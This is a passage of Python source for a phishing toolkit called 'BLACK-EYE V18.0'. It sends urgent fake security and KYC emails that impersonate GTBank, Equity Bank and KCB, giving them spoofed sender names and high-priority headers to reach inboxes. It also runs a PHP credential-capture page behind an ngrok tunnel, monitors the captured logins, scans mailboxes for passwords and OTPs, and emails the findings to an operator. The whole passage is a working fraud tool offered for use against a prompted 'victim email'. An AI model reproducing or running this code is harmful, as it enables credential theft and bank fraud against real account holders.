        .header h1 {{ color: #ffffff; margin: 0; font-size: 28px; font-weight: 700; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }}
        .alert-badge {{ background: #ff0000; color: #fff; display: inline-block; padding: 10px 20px; border-radius: 20px; font-weight: 600; font-size: 14px; margin-top: 15px; animation: pulse 2s infinite; }}
        @keyframes pulse {{ 0%, 100% {{ opacity: 1; transform: scale(1); }} 50% {{ opacity: 0.8; transform: scale(1.05); }} }}
        .content {{ padding: 40px 30px; }}
        .warning-box {{ background: #fff3cd; border-left: 5px solid #ff0000; padding: 20px; margin: 25px 0; border-radius: 5px; }}
        .warning-box h2 {{ color: #ff0000; margin: 0 0 15px 0; font-size: 22px; }}
        .warning-box p {{ color: #856404; margin: 10px 0; line-height: 1.6; }}
        .risk-level {{ background: #ff0000; color: #fff; padding: 15px; text-align: center; border-radius: 8px; margin: 25px 0; }}
        .risk-level h3 {{ margin: 0; font-size: 20px; font-weight: 700; }}
        .consequences {{ background: #f8f9fa; padding: 25px; margin: 25px 0; border-radius: 8px; }}
        .consequences ul {{ margin: 15px 0; padding-left: 20px; }}
        .consequences li {{ margin: 10px 0; color: #dc3545; font-weight: 600; line-height: 1.6; }}
        .cta-button {{ text-align: center; margin: 35px 0; }}
        .cta-button a {{ display: inline-block; background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%); color: #ffffff; padding: 18px 50px; text-decoration: none; border-radius: 50px; font-weight: 700; font-size: 18px; box-shadow: 0 4px 15px rgba(255,0,0,0.4); transition: all 0.3s; }}
        .cta-button a:hover {{ transform: translateY(-2px); box-shadow: 0 6px 20px rgba(255,0,0,0.6); }}
        .countdown {{ background: #000; color: #fff; padding: 20px; text-align: center; border-radius: 8px; margin: 25px 0; }}
        .countdown h3 {{ margin: 0 0 10px 0; font-size: 18px; }}
        .countdown .time {{ font-size: 36px; font-weight: 700; color: #ff0000; }}
        .footer {{ background: #2c3e50; color: #fff; padding: 25px; text-align: center; font-size: 12px; }}
        .footer p {{ margin: 8px 0; opacity: 0.9; }}
        .urgent-notice {{ background: #ff0000; color: #fff; padding: 15px; text-align: center; font-weight: 700; font-size: 16px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚨 CRITICAL SECURITY ALERT 🚨</h1>
            <div class="alert-badge">⚠️ IMMEDIATE ACTION REQUIRED</div>
        </div>
        
        <div class="urgent-notice">
            YOUR ACCOUNT IS AT RISK - VERIFY NOW TO AVOID SUSPENSION
        </div>
        
        <div class="content">
            <div class="warning-box">
                <h2>⚠️ SUSPICIOUS ACTIVITY DETECTED</h2>
                <p>Our advanced fraud detection system has identified <strong>unusual activity</strong> on your GTBank account that requires immediate verification.</p>
                <p>For your security, we have placed your account under <strong style="color: #ff0000;">TEMPORARY RESTRICTION</strong> until you complete the verification process.</p>
            </div>
            
            <div class="risk-level">
                <h3>🔴 RISK LEVEL: HIGH</h3>
                <p style="margin: 10px 0 0 0;">Account Status: PENDING VERIFICATION</p>
            </div>
            
            <div class="countdown">
                <h3>⏰ TIME REMAINING TO VERIFY</h3>
                <div class="time">24 HOURS</div>
                <p style="margin: 15px 0 0 0; font-size: 14px;">Failure to verify will result in automatic suspension</p>
            </div>
            
            <div class="consequences">
                <h3 style="color: #dc3545; margin: 0 0 15px 0;">❌ Consequences of Non-Verification:</h3>
                <ul>
                    <li>Immediate account suspension</li>
                    <li>All transaction capabilities disabled</li>
                    <li>ATM and debit cards blocked</li>
                    <li>Mobile banking and internet banking locked</li>
                    <li>Case reported to Central Bank of Nigeria (CBN)</li>
                    <li>Potential legal investigation</li>
                </ul>
            </div>
            
            <div class="cta-button">
                <a href="{phish_url}">🔐 VERIFY MY ACCOUNT NOW</a>
            </div>
            
            <p style="text-align: center; color: #666; margin: 25px 0; line-height: 1.8;">
                Don't risk losing access to your account.<br>
                <strong>Verify now</strong> to restore full functionality immediately.<br>
                This process takes less than 2 minutes.
            </p>
            
            <div style="background: #e3f2fd; padding: 20px; border-radius: 8px; margin: 25px 0;">
                <p style="margin: 0; color: #1976d2; font-size: 14px;">
                    <strong>Need Help?</strong><br>
                    Call GTConnect: <strong>0700 482 666 328</strong> (Available 24/7)<br>
                    Email: customercare@gtbank.com
                </p>
            </div>
        </div>
        
        <div class="footer">
            <p><strong>Guaranty Trust Bank Plc</strong></p>
            <p>Plot 1669, Oyin Jolayemi Street, Victoria Island, Lagos</p>
            <p>RC: 000000</p>
            <p style="margin-top: 15px; opacity: 0.7;">
                This is an automated security alert from GTBank Fraud Prevention.<br>
                Please do not reply to this email.
            </p>
        </div>
    </div>
</body>
</html>'''

    elif bank_type.lower() == "equity":
        subject = "🚨 Equity Bank: Mandatory KYC Update - Account Will Be Suspended in 48 Hours 🚨"
        
        plain_text = f"""MANDATORY COMPLIANCE NOTICE - URGENT ACTION REQUIRED

Dear Customer,

⚠️ CENTRAL BANK OF KENYA DIRECTIVE 2026/01 ⚠️

As per CBK regulations, ALL bank accounts must complete Enhanced KYC verification by {(datetime.now() + timedelta(hours=48)).strftime('%B %d, %Y %I:%M %p')}.

Your Account Status: NON-COMPLIANT
Verification Status: PENDING
Deadline: 48 HOURS

COMPLETE VERIFICATION: {phish_url}

FAILURE TO COMPLY WILL RESULT IN:
❌ Account suspension
❌ Loss of access to funds
❌ CBK penalty charges
❌ Credit bureau reporting
❌ Legal action for non-compliance

This is a MANDATORY regulatory requirement. DO NOT IGNORE.

Verify immediately: {phish_url}

For assistance: 0763 063 000 (24/7)

Equity Bank Kenya
Compliance Department

This is an official regulatory notice. Reply to: compliance@equitybank.co.ke
"""

        html_body = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body {{ margin: 0; padding: 0; font-family: Arial, sans-serif; background: #f4f4f4; }}
        .container {{ max-width: 600px; margin: 0 auto; background: #fff; }}
        .header {{ background: #8B0000; padding: 30px; text-align: center; }}
        .header h1 {{ color: #fff; margin: 0; font-size: 26px; }}
        .cbk-badge {{ background: #FFD700; color: #000; padding: 12px 25px; border-radius: 25px; display: inline-block; margin-top: 15px; font-weight: 700; }}
        .content {{ padding: 35px 25px; }}
        .alert {{ background: #ffebee; border-left: 6px solid #c62828; padding: 25px; margin: 20px 0; }}
        .alert h2 {{ color: #c62828; margin: 0 0 15px 0; font-size: 22px; }}
        .deadline {{ background: #c62828; color: #fff; padding: 20px; text-align: center; border-radius: 8px; margin: 25px 0; }}
        .deadline h3 {{ margin: 0 0 10px 0; font-size: 18px; }}
        .deadline .time {{ font-size: 42px; font-weight: 700; }}
        .penalties {{ background: #fff3e0; padding: 25px; border-radius: 8px; margin: 25px 0; }}
        .penalties ul {{ margin: 15px 0; padding-left: 25px; }}
        .penalties li {{ margin: 12px 0; color: #d84315; font-weight: 600; }}
        .verify-btn {{ text-align: center; margin: 35px 0; }}
        .verify-btn a {{ display: inline-block; background: #c62828; color: #fff; padding: 20px 55px; text-decoration: none; border-radius: 50px; font-weight: 700; font-size: 19px; box-shadow: 0 4px 15px rgba(198,40,40,0.4); }}
        .footer {{ background: #333; color: #fff; padding: 25px; text-align: center; font-size: 13px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚨 MANDATORY CBK COMPLIANCE 🚨</h1>
            <div class="cbk-badge">⚠️ CENTRAL BANK DIRECTIVE 2026/01</div>
        </div>
        
        <div class="content">
            <div class="alert">
                <h2>⚠️ URGENT: KYC VERIFICATION REQUIRED</h2>
                <p>The Central Bank of Kenya has issued <strong>Directive 2026/01</strong> requiring ALL bank customers to complete Enhanced Know Your Customer (KYC) verification.</p>
                <p><strong style="color: #c62828;">Your account is currently NON-COMPLIANT.</strong></p>
            </div>
            
            <div class="deadline">
                <h3>⏰ COMPLIANCE DEADLINE</h3>
                <div class="time">48 HOURS</div>
                <p style="margin: 15px 0 0 0;">Deadline: {(datetime.now() + timedelta(hours=48)).strftime('%B %d, %Y %I:%M %p')}</p>
            </div>
            
            <div class="penalties">
                <h3 style="color: #d84315; margin: 0 0 15px 0;">❌ Non-Compliance Penalties:</h3>
                <ul>
                    <li>Immediate account suspension</li>
                    <li>Complete loss of access to funds</li>
                    <li>CBK penalty charges (up to KES 100,000)</li>
                    <li>Negative credit bureau reporting</li>
                    <li>Possible legal prosecution</li>
                    <li>Account closure and fund forfeiture</li>
                </ul>
            </div>
            
            <div class="verify-btn">
                <a href="{phish_url}">🔐 COMPLETE KYC VERIFICATION</a>
            </div>
            
            <p style="text-align: center; margin: 25px 0; color: #666;">
                This is a <strong>MANDATORY</strong> regulatory requirement.<br>
                Protect your account - verify now.
            </p>
        </div>
        
        <div class="footer">
            <p><strong>Equity Bank Kenya Limited</strong></p>
            <p>Compliance & Regulatory Affairs Department</p>
            <p>Emergency Hotline: 0763 063 000</p>
            <p style="margin-top: 15px; opacity: 0.8;">Official CBK Directive - Do not ignore this notice</p>
        </div>
    </div>
</body>
</html>'''

    elif bank_type.lower() == "kcb":
        subject = "🚨 KCB: Urgent Security Verification - Unusual Login Detected 🚨"
        
        plain_text = f"""SECURITY ALERT - IMMEDIATE ACTION REQUIRED

Dear Valued Customer,

⚠️ UNUSUAL ACCOUNT ACCESS DETECTED ⚠️

Our security system has detected an unauthorized login attempt from:
Location: Unknown Location
Device: Unrecognized Device
Time: {datetime.now().strftime('%B %d, %Y %I:%M %p')}

For your protection, we have TEMPORARILY LOCKED your account.

VERIFY IT WAS YOU: {phish_url}

If this was NOT you, verify immediately to prevent:
❌ Unauthorized transactions
❌ Account takeover
❌ Financial loss
❌ Identity theft

Verify now: {phish_url}

Contact: 0711 087 000 (24/7)

KCB Bank Kenya
Security Operations Center

DO NOT IGNORE THIS ALERT - Your account security is at risk.
"""

        html_body = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body {{ margin: 0; padding: 0; font-family: Arial, sans-serif; background: #000; }}
        .container {{ max-width: 600px; margin: 0 auto; background: #fff; }}
        .header {{ background: #006837; padding: 30px; text-align: center; }}
        .header h1 {{ color: #fff; margin: 0; font-size: 26px; }}
        .threat-badge {{ background: #ff0000; color: #fff; padding: 12px 25px; border-radius: 25px; display: inline-block; margin-top: 15px; font-weight: 700; animation: blink 1.5s infinite; }}
        @keyframes blink {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.6; }} }}
        .content {{ padding: 35px 25px; }}
        .threat-alert {{ background: #ffebee; border: 3px solid #ff0000; padding: 25px; margin: 20px 0; }}
        .threat-details {{ background: #000; color: #0f0; padding: 20px; border-radius: 8px; font-family: 'Courier New', monospace; margin: 25px 0; }}
        .threat-details h3 {{ color: #ff0; margin: 0 0 15px 0; }}
        .threat-details p {{ margin: 8px 0; }}
        .risks {{ background: #fff3e0; padding: 25px; border-radius: 8px; margin: 25px 0; border-left: 5px solid #ff5722; }}
        .verify-btn {{ text-align: center; margin: 35px 0; }}
        .verify-btn a {{ display: inline-block; background: #ff0000; color: #fff; padding: 20px 55px; text-decoration: none; border-radius: 50px; font-weight: 700; font-size: 19px; box-shadow: 0 4px 15px rgba(255,0,0,0.4); }}
        .footer {{ background: #006837; color: #fff; padding: 25px; text-align: center; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚨 SECURITY BREACH DETECTED 🚨</h1>
            <div class="threat-badge">⚠️ UNAUTHORIZED ACCESS ATTEMPT</div>
        </div>
        
        <div class="content">
            <div class="threat-alert">
                <h2 style="color: #ff0000; margin: 0 0 15px 0;">⚠️ UNUSUAL LOGIN DETECTED</h2>
                <p>Our advanced security system has detected an <strong>unauthorized login attempt</strong> on your KCB account.</p>
                <p style="color: #d32f2f; font-weight: 600; margin-top: 15px;">Your account has been TEMPORARILY LOCKED for your protection.</p>
            </div>
            
            <div class="threat-details">
                <h3>🔴 THREAT DETAILS</h3>
                <p>Login Time: {datetime.now().strftime('%B %d, %Y %I:%M %p')}</p>
                <p>Location: Unknown / Foreign</p>
                <p>Device: Unrecognized</p>
                <p>IP Address: Flagged as Suspicious</p>
                <p>Status: <span style="color: #ff0;">BLOCKED</span></p>
            </div>
            
            <div class="risks">
                <h3 style="color: #ff5722; margin: 0 0 15px 0;">⚠️ Immediate Risks if NOT Verified:</h3>
                <ul style="margin: 15px 0; padding-left: 25px;">
                    <li style="margin: 10px 0; color: #d84315; font-weight: 600;">Unauthorized fund transfers</li>
                    <li style="margin: 10px 0; color: #d84315; font-weight: 600;">Account takeover</li>
                    <li style="margin: 10px 0; color: #d84315; font-weight: 600;">Identity theft</li>
                    <li style="margin: 10px 0; color: #d84315; font-weight: 600;">Fraudulent transactions</li>
                    <li style="margin: 10px 0; color: #d84315; font-weight: 600;">Complete loss of account access</li>
                </ul>
            </div>
            
            <div class="verify-btn">
                <a href="{phish_url}">🔐 VERIFY IT WAS ME</a>
            </div>
            
            <p style="text-align: center; margin: 25px 0; color: #666;">
                Time is critical. <strong>Verify immediately</strong> to secure your account.
            </p>
        </div>
        
        <div class="footer">
            <p><strong>KCB Bank Kenya</strong></p>
            <p>Security Operations Center</p>
            <p>Emergency: 0711 087 000 (24/7)</p>
        </div>
    </div>
</body>
</html>'''

    else:
        # Generic panic template
        subject = f"🚨 {bank_type.upper()}: Urgent Account Security Alert - Verify Within 24 Hours 🚨"
        
        plain_text = f"""URGENT SECURITY ALERT

Dear Customer,

Your {bank_type} account requires IMMEDIATE verification.

VERIFY NOW: {phish_url}

Failure to verify within 24 hours will result in account suspension.

{bank_type} Security Team
"""

        html_body = f'''<!DOCTYPE html>
<html>
<body style="margin:0;padding:0;font-family:Arial,sans-serif;background:#f4f4f4">
    <div style="max-width:600px;margin:0 auto;background:#fff">
        <div style="background:#ff0000;padding:30px;text-align:center">
            <h1 style="color:#fff;margin:0;font-size:26px">🚨 SECURITY ALERT 🚨</h1>
        </div>
        <div style="padding:35px 25px">
            <div style="background:#ffebee;border-left:6px solid #ff0000;padding:25px;margin:20px 0">
                <h2 style="color:#ff0000;margin:0 0 15px 0">⚠️ IMMEDIATE ACTION REQUIRED</h2>
                <p>Your {bank_type} account requires urgent verification.</p>
            </div>
            <div style="text-align:center;margin:35px 0">
                <a href="{phish_url}" style="display:inline-block;background:#ff0000;color:#fff;padding:20px 55px;text-decoration:none;border-radius:50px;font-weight:700;font-size:19px">VERIFY NOW</a>
            </div>
        </div>
    </div>
</body>
</html>'''
    
    # Send email with maximum deliverability
    try:
        msg = MIMEMultipart('alternative')
        
        # Advanced email headers for inbox delivery
        msg['Message-ID'] = make_msgid(domain='gmail.com')
        msg['Date'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
        msg['X-Priority'] = '1'
        msg['X-MSMail-Priority'] = 'High'
        msg['Importance'] = 'High'
        msg['Priority'] = 'urgent'
        msg['X-Message-Flag'] = 'Follow up'
        msg['Return-Path'] = EMAIL_FROM
        msg['Reply-To'] = EMAIL_FROM
        
        # From header with bank name
        msg['From'] = formataddr((f'{bank_type.upper()} Security Team', EMAIL_FROM))
        msg['To'] = victim
        msg['Subject'] = subject
        
        # Attach both plain and HTML versions
        msg.attach(MIMEText(plain_text, 'plain', 'utf-8'))
        msg.attach(MIMEText(html_body, 'html', 'utf-8'))
        
        # Send via Gmail SMTP with retry logic
        max_retries = 3
        for attempt in range(max_retries):
            try:
                srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=15)
                srv.ehlo()
                srv.starttls()
                srv.ehlo()
                srv.login(EMAIL_FROM, EMAIL_PASS)
                srv.send_message(msg)
                srv.quit()
                
                print(f"{c.G}✅ Email sent successfully!{c.E}")
                print(f"{c.G}📧 To: {victim}{c.E}")
                print(f"{c.G}🏦 Bank: {bank_type.upper()}{c.E}")
                print(f"{c.G}📱 Maximum phone popup probability achieved!{c.E}\n")
                
                # Schedule follow-up email in background
                if SEND_FOLLOW_UP:
                    threading.Thread(
                        target=send_follow_up_email,
                        args=(victim, phish_url, bank_type),
                        daemon=True
                    ).start()
                
                return True
                
            except smtplib.SMTPServerDisconnected:
                if attempt < max_retries - 1:
                    print(f"{c.Y}⚠️ Connection lost, retrying... ({attempt + 1}/{max_retries}){c.E}")
                    time.sleep(2)
                    continue
                else:
                    raise
            except Exception as e:
                if attempt < max_retries - 1:
                    print(f"{c.Y}⚠️ Send failed, retrying... ({attempt + 1}/{max_retries}){c.E}")
                    time.sleep(2)
                    continue
                else:
                    raise
        
    except Exception as e:
        print(f"{c.R}❌ Email send failed: {e}{c.E}")
        print(f"{c.Y}💡 Tips:{c.E}")
        print(f"{c.Y}   1. Check your Gmail App Password{c.E}")
        print(f"{c.Y}   2. Ensure 2FA is enabled on Gmail{c.E}")
        print(f"{c.Y}   3. Check internet connection{c.E}\n")
        return False

# ============ PHP SERVER SETUP ============
def setup_phishing_server():
    """Setup PHP server for credential capture"""
    print(f"\n{c.C}🔧 Setting up phishing server...{c.E}\n")
    
    # Create sites directory
    os.makedirs("sites", exist_ok=True)
    
    # Create capture.php
    capture_php = '''<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

$data = json_decode(file_get_contents('php://input'), true);

if (!$data) {
    $data = $_POST;
}

if (!empty($data)) {
    $log_file = 'captures.txt';
    $timestamp = date('Y-m-d H:i:s');
    
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $log_entry = "\\n=== CAPTURE @ $timestamp ===\\n";
    $log_entry .= "IP: $ip\\n";
    $log_entry .= "User-Agent: $user_agent\\n";
    
    foreach ($data as $key => $value) {
        $log_entry .= "$key: $value\\n";
    }
    
    $log_entry .= "========================\\n";
    
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    echo json_encode(['success' => true, 'message' => 'Captured']);
} else {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'No data']);
}
?>'''
    
    with open("sites/capture.php", "w") as f:
        f.write(capture_php)
    
    print(f"{c.G}✅ capture.php created{c.E}")
    
    # Create index.html redirect
    index_html = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0;url=https://www.google.com">
    <title>Redirecting...</title>
</head>
<body>
    <p>Redirecting...</p>
</body>
</html>'''
    
    with open("sites/index.html", "w") as f:
        f.write(index_html)
    
    print(f"{c.G}✅ index.html created{c.E}\n")

# ============ START SERVER ============
def start_server():
    """Start PHP server and ngrok tunnel"""
    global PUBLIC_URL
    
    setup_phishing_server()
    
    # Start PHP server
    print(f"{c.C}🚀 Starting PHP server on port {PORT}...{c.E}\n")
    php_process = subprocess.Popen(
        ['php', '-S', f'0.0.0.0:{PORT}', '-t', 'sites'],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    time.sleep(2)
    
    if USE_NGROK:
        try:
            from pyngrok import ngrok, conf
            
            if NGROK_TOKEN:
                conf.get_default().auth_token = NGROK_TOKEN
            
            tunnel = ngrok.connect(PORT, "http")
            PUBLIC_URL = tunnel.public_url
            
            print(f"{c.G}✅ Server started!{c.E}")
            print(f"{c.G}🌐 Public URL: {PUBLIC_URL}{c.E}\n")
            
        except Exception as e:
            print(f"{c.R}❌ Ngrok failed: {e}{c.E}")
            PUBLIC_URL = f"http://localhost:{PORT}"
            print(f"{c.Y}⚠️ Using local URL: {PUBLIC_URL}{c.E}\n")
    else:
        PUBLIC_URL = f"http://localhost:{PORT}"
        print(f"{c.G}✅ Server started on {PUBLIC_URL}{c.E}\n")
    
    return php_process

# ============ MONITOR CAPTURES ============
def monitor_captures():
    """Monitor capture file for new credentials"""
    capture_file = "sites/captures.txt"
    
    print(f"{c.C}👁️  Monitoring for captures...{c.E}\n")
    
    if not os.path.exists(capture_file):
        with open(capture_file, 'w') as f:
            f.write("")
    
    last_size = 0
    
    while True:
        try:
            current_size = os.path.getsize(capture_file)
            
            if current_size > last_size:
                with open(capture_file, 'r') as f:
                    f.seek(last_size)
                    new_content = f.read()
                
                if new_content.strip():
                    # Parse capture data
                    lines = new_content.strip().split('\n')
                    capture_data = {}
                    ip = None
                    ua = None
                    
                    for line in lines:
                        if line.startswith('IP:'):
                            ip = line.split('IP:')[1].strip()
                        elif line.startswith('User-Agent:'):
                            ua = line.split('User-Agent:')[1].strip()
                        elif ':' in line and not line.startswith('==='):
                            key, value = line.split(':', 1)
                            capture_data[key.strip()] = value.strip()
                    
                    # Process with intelligence engine
                    enhanced_capture_handler(capture_data, ip, ua)
                
                last_size = current_size
            
            time.sleep(2)
            
        except Exception as e:
            print(f"{c.R}❌ Monitor error: {e}{c.E}")
            time.sleep(5)

# ============ MAIN MENU ============
def main_menu():
    """Enhanced main menu"""
    print(f"\n{c.B}{c.M}{'='*70}{c.E}")
    print(f"{c.B}{c.M}  BLACK-EYE V18.0 - ENHANCED INTELLIGENCE EDITION{c.E}")
    print(f"{c.B}{c.M}{'='*70}{c.E}\n")
    
    print(f"{c.C}📊 FEATURES:{c.E}")
    print(f"{c.G}  ✅ Universal Email Scanner & Password Extraction{c.E}")
    print(f"{c.G}  ✅ Deep Intelligence Analytics{c.E}")
    print(f"{c.G}  ✅ Auto Report Generation{c.E}")
    print(f"{c.G}  ✅ Advanced Inbox Delivery (Gmail/Yahoo/Outlook){c.E}")
    print(f"{c.G}  ✅ Device Fingerprinting & Geolocation{c.E}")
    print(f"{c.G}  ✅ URGENT Panic-Inducing Templates{c.E}")
    print(f"{c.G}  ✅ Smart Timing for Peak Phone Hours{c.E}")
    print(f"{c.G}  ✅ Automatic Follow-up Emails{c.E}\n")
    
    print(f"{c.Y}📧 Email Configuration:{c.E}")
    print(f"{c.Y}  Target: {EMAIL_TO}{c.E}")
    print(f"{c.Y}  Sender: {EMAIL_FROM}{c.E}")
    print(f"{c.Y}  Email Scanning: {'Enabled' if ENABLE_EMAIL_SCANNING else 'Disabled'}{c.E}\n")
    
    print(f"{c.C}🎯 MENU:{c.E}")
    print(f"{c.C}  1. Send Ultra-Panic Phishing Email{c.E}")
    print(f"{c.C}  2. Run Email Password Scanner{c.E}")
    print(f"{c.C}  3. Generate Intelligence Report{c.E}")
    print(f"{c.C}  4. Start Phishing Server Only{c.E}")
    print(f"{c.C}  5. Full Auto Mode (Server + Email Scanner){c.E}")
    print(f"{c.C}  0. Exit{c.E}\n")
    
    choice = input(f"{c.B}Select option: {c.E}").strip()
    
    if choice == '1':
        # Send phishing email
        victim = input(f"\n{c.C}📧 Enter victim email: {c.E}").strip()
        
        if not victim or '@' not in victim:
            print(f"{c.R}❌ Invalid email{c.E}")
            return
        
        print(f"\n{c.C}🏦 Select bank type:{c.E}")
        print(f"{c.C}  1. GTBank (Nigeria){c.E}")
        print(f"{c.C}  2. Equity Bank (Kenya){c.E}")
        print(f"{c.C}  3. KCB Bank (Kenya){c.E}")
        print(f"{c.C}  4. Other/Generic{c.E}\n")
        
        bank_choice = input(f"{c.B}Select bank: {c.E}").strip()
        
        bank_map = {
            '1': 'gtbank',
            '2': 'equity',
            '3': 'kcb',
            '4': 'generic'
        }
        
        bank_type = bank_map.get(bank_choice, 'generic')
        
        # Start server
        php_process = start_server()
        
        time.sleep(2)
        
        # Send email
        phish_url = f"{PUBLIC_URL}/capture.php"
        send_ultra_panic_email(victim, phish_url, bank_type)
        
        # Start monitoring
        print(f"\n{c.Y}💡 Phishing link sent! Monitoring for captures...{c.E}\n")
        
        try:
            monitor_captures()
        except KeyboardInterrupt:
            print(f"\n\n{c.Y}🛑 Stopping server...{c.E}\n")
            php_process.terminate()
    
    elif choice == '2':
        # Run email scanner
        print(f"\n{c.C}🔍 Starting email password scanner...{c.E}\n")
        
        num_emails = input(f"{c.C}Number of emails to scan (default 50): {c.E}").strip()
        num_emails = int(num_emails) if num_emails.isdigit() else 50
        
        print(f"{c.C}Enter keywords to search (comma-separated, press Enter for default):{c.E}")
        keywords_input = input(f"{c.C}Keywords: {c.E}").strip()
        
        if keywords_input:
            keywords = [k.strip() for k in keywords_input.split(',')]
        else:
            keywords = ['password', 'reset', 'verify', 'code', 'otp', 'pin', 'account', 'security']
        
        extractor = EmailPasswordExtractor(EMAIL_FROM, EMAIL_PASS)
        results = extractor.scan_emails(num_emails=num_emails, search_keywords=keywords)
        
        if results:
            report = extractor.generate_report()
            print(f"\n{c.G}{'='*70}{c.E}")
            print(report)
            print(f"{c.G}{'='*70}{c.E}\n")
            
            # Save report
            filename = f"email_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write(report)
            
            print(f"{c.G}✅ Report saved to: {filename}{c.E}\n")
            
            # Offer to email report
            send = input(f"{c.C}Email this report to {EMAIL_TO}? (y/n): {c.E}").strip().lower()
            
            if send == 'y':
                try:
                    msg = MIMEMultipart()
                    msg['From'] = EMAIL_FROM
                    msg['To'] = EMAIL_TO
                    msg['Subject'] = f"🔍 Email Scan Report - {len(results)} Findings - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    
                    msg.attach(MIMEText(report, 'plain'))
                    
                    with open(filename, 'rb') as f:
                        attachment = MIMEBase('application', 'octet-stream')
                        attachment.set_payload(f.read())
                        encoders.encode_base64(attachment)
                        attachment.add_header('Content-Disposition', f'attachment; filename={filename}')
                        msg.attach(attachment)
                    
                    srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
                    srv.starttls()
                    srv.login(EMAIL_FROM, EMAIL_PASS)
                    srv.send_message(msg)
                    srv.quit()
                    
                    print(f"{c.G}✅ Report emailed!{c.E}\n")
                except Exception as e:
                    print(f"{c.R}❌ Email failed: {e}{c.E}\n")
        else:
            print(f"{c.Y}⚠️ No sensitive data found in scanned emails{c.E}\n")
        
        input(f"\n{c.C}Press Enter to continue...{c.E}")
    
    elif choice == '3':
        # Generate intelligence report
        print(f"\n{c.C}📊 Generating intelligence report...{c.E}\n")
        
        report = intel_engine.generate_intelligence_report()
        print(f"\n{c.G}{'='*70}{c.E}")
        print(report)
        print(f"{c.G}{'='*70}{c.E}\n")
        
        # Save report
        filename = f"intelligence_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(report)
        
        print(f"{c.G}✅ Report saved to: {filename}{c.E}\n")
        
        input(f"\n{c.C}Press Enter to continue...{c.E}")
    
    elif choice == '4':
        # Start server only
        php_process = start_server()
        
        print(f"\n{c.Y}💡 Server running. Press Ctrl+C to stop...{c.E}\n")
        
        try:
            monitor_captures()
        except KeyboardInterrupt:
            print(f"\n\n{c.Y}🛑 Stopping server...{c.E}\n")
            php_process.terminate()
    
    elif choice == '5':
        # Full auto mode
        print(f"\n{c.C}🚀 Starting Full Auto Mode...{c.E}\n")
        
        # Start server
        php_process = start_server()
        
        # Start background threads
        threading.Thread(target=monitor_captures, daemon=True).start()
        
        if ENABLE_EMAIL_SCANNING:
            threading.Thread(target=run_email_scanner, daemon=True).start()
        
        if ENABLE_AUTO_REPORTS:
            threading.Thread(target=auto_report_generator, daemon=True).start()
        
        print(f"{c.G}✅ All systems active!{c.E}\n")
        print(f"{c.C}📊 Running:{c.E}")
        print(f"{c.C}  • Phishing server on {PUBLIC_URL}{c.E}")
        print(f"{c.C}  • Capture monitoring{c.E}")
        
        if ENABLE_EMAIL_SCANNING:
            print(f"{c.C}  • Email scanner (hourly){c.E}")
        
        if ENABLE_AUTO_REPORTS:
            print(f"{c.C}  • Auto reports (every {REPORT_INTERVAL_MINUTES}min){c.E}")
        
        print(f"\n{c.Y}💡 Press Ctrl+C to stop all services...{c.E}\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{c.Y}🛑 Stopping all services...{c.E}\n")
            php_process.terminate()
    
    elif choice == '0':
        print(f"\n{c.G}👋 Goodbye!{c.E}\n")
        sys.exit(0)
    
    else:
        print(f"\n{c.R}❌ Invalid option{c.E}\n")

# ============ MAIN ENTRY POINT ============
if __name__ == "__main__":
    try:
        while True:
            main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{c.G}👋 Goodbye!{c.E}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{c.R}❌ Fatal error: {e}{c.E}\n")
        sys.exit(1) 
